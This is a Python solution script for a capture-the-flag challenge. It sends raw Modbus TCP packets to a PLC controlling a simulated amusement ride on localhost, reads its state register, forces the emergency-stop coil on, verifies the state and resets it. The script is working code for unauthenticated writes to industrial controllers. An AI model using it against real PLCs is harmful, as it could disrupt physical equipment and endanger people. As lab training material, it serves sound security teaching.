#!/usr/bin/env python3
"""
CTF Challenge 2: Emergency Override (Easy - 150 points)
Trigger the emergency stop through Modbus while the ride is running

Method: Write TRUE to emergency_stop_button (coil 2)
"""

import socket
import struct
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_coil(transaction_id, address, value):
    """Build a Modbus Write Single Coil request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 5

    value_bytes = 0xFF00 if value else 0x0000

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        value_bytes
    )

def build_read_register(transaction_id, address, quantity):
    """Build a Modbus Read Holding Registers request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 3

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_registers_response(response):
    """Parse a Read Holding Registers response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    num_registers = byte_count // 2

    registers = []
    for i in range(num_registers):
        offset = 9 + (i * 2)
        reg_value = struct.unpack('>H', response[offset:offset+2])[0]
        registers.append(reg_value)

    return registers

def main():
    print("="*60)
    print("CTF Challenge 2: Emergency Override")
    print("="*60)
    print()
    print("Objective: Trigger emergency stop via Modbus")
    print("Method: Write TRUE to emergency_stop_button coil")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1

    print("\n[Phase 1] Reading current PLC state...")
    request = build_read_register(transaction_id, 6, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        state = registers[0]
        state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency', 'Maintenance']
        print(f"  Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

    transaction_id += 1

    print("\n[Phase 2] Triggering Emergency Stop...")
    print("  Writing TRUE to coil 2 (emergency_stop_button)")

    # Write TRUE to emergency_stop_button (coil 2)
    request = build_write_coil(transaction_id, 2, True)
    sock.send(request)
    response = sock.recv(1024)

    print("  ✓ Emergency stop signal sent")

    transaction_id += 1
    time.sleep(1)

    print("\n[Phase 3] Verifying state change...")
    request = build_read_register(transaction_id, 6, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        new_state = registers[0]
        state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency', 'Maintenance']
        print(f"  New State: {new_state} ({state_names[new_state] if new_state < len(state_names) else 'Unknown'})")

        if new_state == 4:
            print("\n🎯 SUCCESS! PLC in Emergency state")
            print("   Challenge completed!")
        else:
            print("\n⚠️  State did not change to Emergency")
            print("   Make sure the ride is running before executing")

    print("\n[Phase 4] Resetting emergency stop...")
    transaction_id += 1
    request = build_write_coil(transaction_id, 2, False)
    sock.send(request)
    sock.recv(1024)
    print("  ✓ Emergency stop cleared")

    sock.close()

if __name__ == '__main__':
    main()
